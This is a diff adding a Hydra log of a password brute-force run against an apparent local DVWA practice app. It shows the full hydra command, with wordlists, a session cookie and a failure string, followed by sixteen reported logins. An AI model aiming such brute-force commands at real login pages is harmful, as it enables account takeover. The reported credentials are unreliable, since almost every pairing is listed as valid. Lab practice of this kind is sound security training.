@@ -1,0 +1,17 @@
+# Hydra v9.7 run at 2026-09-23 01:50:14 on localhost http-get (hydra -L usuarios.txt -P passwords.txt -s 8080 -o - -V -c PHPSESSID=36du3sevrr7jeh2611ckc87lk3; security=low localhost http-get /vulnerabilities/brute/?username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect)
+[8080][http-get] host: localhost   login: admin   password: abc123
+[8080][http-get] host: localhost   login: pablo   password: password
+[8080][http-get] host: localhost   login: gordon   password: abc123
+[8080][http-get] host: localhost   login: admin   password: password
+[8080][http-get] host: localhost   login: admin   password: letmein
+[8080][http-get] host: localhost   login: admin   password: charlie
+[8080][http-get] host: localhost   login: pablo   password: letmein
+[8080][http-get] host: localhost   login: pablo   password: abc123
+[8080][http-get] host: localhost   login: gordon   password: password
+[8080][http-get] host: localhost   login: gordon   password: letmein
+[8080][http-get] host: localhost   login: pablo   password: charlie
+[8080][http-get] host: localhost   login: 1337   password: letmein
+[8080][http-get] host: localhost   login: 1337   password: abc123
+[8080][http-get] host: localhost   login: gordon   password: charlie
+[8080][http-get] host: localhost   login: 1337   password: password
+[8080][http-get] host: localhost   login: 1337   password: charlie
